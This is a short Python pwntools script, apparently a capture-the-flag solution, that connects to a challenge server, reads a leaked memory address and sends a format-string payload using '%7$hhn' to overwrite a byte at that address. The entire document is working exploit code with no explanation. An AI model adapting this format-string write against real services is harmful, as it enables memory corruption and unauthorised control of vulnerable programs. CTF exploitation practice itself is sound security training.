from pwn import *

host, port = 'pwn.challs.ctf.shellmates.club', 1404
p = remote(host, port)

s = p.recvuntil(b'Name : ').decode()
addr = s.split('\n')[0].split(':')[1].strip()
print(f'Leak: {addr}')

padd = 2
value = 0x155 - padd - 4
payload = b'a'*padd + p32(int(addr, 16)) + b'%' + f'{value}'.encode() + b'x%7$hhn'
print(payload)

p.sendline(payload)
print(p.recvline())
print(p.recvline())
print(p.recvline())
